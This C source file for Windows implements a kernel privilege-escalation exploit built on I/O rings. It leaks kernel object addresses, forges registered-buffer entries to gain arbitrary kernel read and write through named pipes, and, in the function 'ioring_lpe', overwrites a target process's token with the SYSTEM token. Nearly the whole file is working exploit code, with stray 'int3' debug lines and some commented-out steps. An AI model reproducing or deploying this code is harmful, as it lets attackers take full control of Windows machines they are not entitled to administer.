#pragma warning (disable: 4005)			// warning C4005:

#include <windows.h>
#include <ioringapi.h>
#include <winternl.h>
#include <ntstatus.h>

#include "ioring.h"
#include "win_defs.h"

HIORING hIoRing = NULL;
PIORING_OBJECT pIoRing = NULL;
HANDLE hInPipe = INVALID_HANDLE_VALUE;
HANDLE hOutPipe = INVALID_HANDLE_VALUE;
HANDLE hInPipeClient = INVALID_HANDLE_VALUE;
HANDLE hOutPipeClient = INVALID_HANDLE_VALUE;


int ioring_setup(PIORING_OBJECT* ppIoRingAddr)
{
    int ret = -1;
    IORING_CREATE_FLAGS ioRingFlags = { 0 };

    ioRingFlags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    ioRingFlags.Advisory = IORING_CREATE_REQUIRED_FLAGS_NONE;

    ret = _CreateIoRing(IORING_VERSION_3, ioRingFlags, 0x10000, 0x20000, &hIoRing);

    if (0 != ret)
    {
        goto done;
    }
    
    ret = getobjptr((PULONG64)ppIoRingAddr, GetCurrentProcessId(), *(PHANDLE)hIoRing);

    if (0 != ret)
    {
        goto done;
    }

    pIoRing = *ppIoRingAddr;
    /*
    {
        BYTE bb[0x1000];
        IORING_BUFFER_INFO ibi[2];
        HANDLE hEvent = CreateEvent(0, 1, 0, 0);
        if (pIoRing) int3
        {
            SetIoRingCompletionEvent(hIoRing, hEvent);
            //if (pIoRing) int3
        }
    }
    */

    hInPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_in", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    hOutPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_out", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);

    if ((INVALID_HANDLE_VALUE == hInPipe) || (INVALID_HANDLE_VALUE == hOutPipe))
    {
        ret = GetLastError();
        goto done;
    }

    hInPipeClient = CreateFile(L"\\\\.\\pipe\\ioring_in", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    hOutPipeClient = CreateFile(L"\\\\.\\pipe\\ioring_out", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if ((INVALID_HANDLE_VALUE == hInPipeClient) || (INVALID_HANDLE_VALUE == hOutPipeClient))
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int getobjptr(PULONG64 ppObjAddr, ULONG ulPid, HANDLE handle)
{
    int ret = -1;
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
    ULONG ulBytes = 0;
    NTSTATUS ntStatus = STATUS_SUCCESS;

    while ((ntStatus = _NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (pHandleInfo != NULL)
        {
            pHandleInfo = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, 2 * ulBytes);
        }

        else
        {
            pHandleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
        }
    }

    if (ntStatus != STATUS_SUCCESS)
    {
        ret = ntStatus;
        goto done;
    }

    for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
    {
        if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && ((HANDLE)pHandleInfo->Handles[i].HandleValue == handle))
        {
            *ppObjAddr = (ULONG64)pHandleInfo->Handles[i].Object;
            ret = 0;
            break;
        }
    }

done:
    if (NULL != pHandleInfo)
    {
        HeapFree(GetProcessHeap, 0, pHandleInfo);
    }
    return ret;
}

int ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer, ULONG ulReadLen)
{
    int ret = -1;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hOutPipeClient);
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };

    pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);

    if (NULL == pMcBufferEntry)
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry->Address = (PVOID)pReadAddr;
    pMcBufferEntry->Length = ulReadLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    pRegisterBuffers[0] = (ULONG64)pMcBufferEntry;

    ret = _BuildIoRingWriteFile(hIoRing, reqFile, reqBuffer, ulReadLen, 0, FILE_WRITE_FLAGS_NONE, 0, IOSQE_FLAGS_NONE);

    if (0 != ret)
    {
        goto done;
    }

    ret = _SubmitIoRing(hIoRing, 0, 0, NULL);

    if (0 != ret)
    {
        goto done;
    }

    ret = _PopIoRingCompletion(hIoRing, &cqe);

    if (0 != ret)
    {
        goto done;
    }

    if (0 != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        goto done;
    }

    if (0 == ReadFile(hOutPipe, pReadBuffer, ulReadLen, NULL, NULL))
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return ret;
}

int ioring_write(PULONG64 pRegisterBuffers, ULONG64 pWriteAddr, PVOID pWriteBuffer, ULONG ulWriteLen)
{
    int ret = -1;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hInPipeClient);
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };

    if (0 == WriteFile(hInPipe, pWriteBuffer, ulWriteLen, NULL, NULL))
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);

    if (NULL == pMcBufferEntry)
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry->Address = (PVOID)pWriteAddr;
    pMcBufferEntry->Length = ulWriteLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    pRegisterBuffers[0] = (ULONG64)pMcBufferEntry;

    ret = _BuildIoRingReadFile(hIoRing, reqFile, reqBuffer, ulWriteLen, 0, 0, IOSQE_FLAGS_NONE);

    if (0 != ret)
    {
        goto done;
    }

    ret = _SubmitIoRing(hIoRing, 0, 0, NULL);

    if (0 != ret)
    {
        goto done;
    }

    ret = _PopIoRingCompletion(hIoRing, &cqe);

    if (0 != ret)
    {
        goto done;
    }

    if (0 != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        goto done;
    }

    ret = 0;

done:
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return ret;
}

int ioring_read2(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer, ULONG ulReadLen)
{
    _HIORING* phIoRing = NULL;
    int ret = -1;

    memset(pRegisterBuffers, 0, sizeof(ULONG64) * 1);

    phIoRing = *(_HIORING**)&hIoRing;
    phIoRing->RegBufferArray = pRegisterBuffers;
    phIoRing->BufferArraySize = 1;

    ret = ioring_read(pRegisterBuffers, pReadAddr, pReadBuffer, sizeof(ULONG64));
    int3
    return ret;
}

int ioring_lpe(DWORD pid, PVOID ullFakeRegBufferAddr, ULONG ulFakeRegBufferCnt)
{
    int ret = -1;
    HANDLE hProc = NULL;
    ULONG64 ullSystemEPROCaddr = 0;
    ULONG64 ullTargEPROCaddr = 0;
    PVOID pFakeRegBuffers = ullFakeRegBufferAddr;
    _HIORING* phIoRing = NULL;
    ULONG64 ullSysToken = 0;
    ULONG64 ullSysTokenCount = 0;
    char null[0x10] = { 0 };

    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);

    if (NULL == hProc)
    {
        ret = GetLastError();
        goto done;
    }

    ret = getobjptr(&ullSystemEPROCaddr, 4, (HANDLE)4);

    if (0 != ret)
    {
        goto done;
    }

    //printf("[+] System EPROC address: %llx\n", ullSystemEPROCaddr);

    ret = getobjptr(&ullTargEPROCaddr, GetCurrentProcessId(), hProc);

    if (0 != ret)
    {
        goto done;
    }

    //printf("[+} Target process EPROC address: %llx\n", ullTargEPROCaddr);

    //pFakeRegBuffers = VirtualAlloc(ullFakeRegBufferAddr, sizeof(ULONG64) * ulFakeRegBufferCnt, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (pFakeRegBuffers != ullFakeRegBufferAddr)
    {
        ret = GetLastError();
        goto done;
    }

    memset(pFakeRegBuffers, 0, sizeof(ULONG64) * ulFakeRegBufferCnt);

    phIoRing = *(_HIORING**)&hIoRing;
    phIoRing->RegBufferArray = pFakeRegBuffers;
    phIoRing->BufferArraySize = ulFakeRegBufferCnt;

    ret = ioring_read(pFakeRegBuffers, ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, &ullSysToken, sizeof(ULONG64));

    if (0 != ret)
    {
        goto done;
    }

    //printf("[+] System token is at: %llx\n", ullSysToken);
    //ret = ioring_read(pFakeRegBuffers, (ullSysToken & 0xFFFFFFFFFFFFFFF0) - 6 * sizeof(PVOID), &ullSysTokenCount, sizeof(ULONG64));
    //ullSysTokenCount += 0x10;
    //ret = ioring_write(pFakeRegBuffers, (ullSysToken & 0xFFFFFFFFFFFFFFF0) - 6 * sizeof(PVOID), &ullSysTokenCount, sizeof(ULONG64));

    ret = ioring_write(pFakeRegBuffers, ullTargEPROCaddr + EPROC_TOKEN_OFFSET, &ullSysToken, sizeof(ULONG64));

    if (0 != ret)
    {
        goto done;
    }

    ioring_write((PULONG64)pFakeRegBuffers, (ULONG64)&pIoRing->RegBuffersCount, &null, 0x10);

    ret = 0;

done:
    return ret;
}
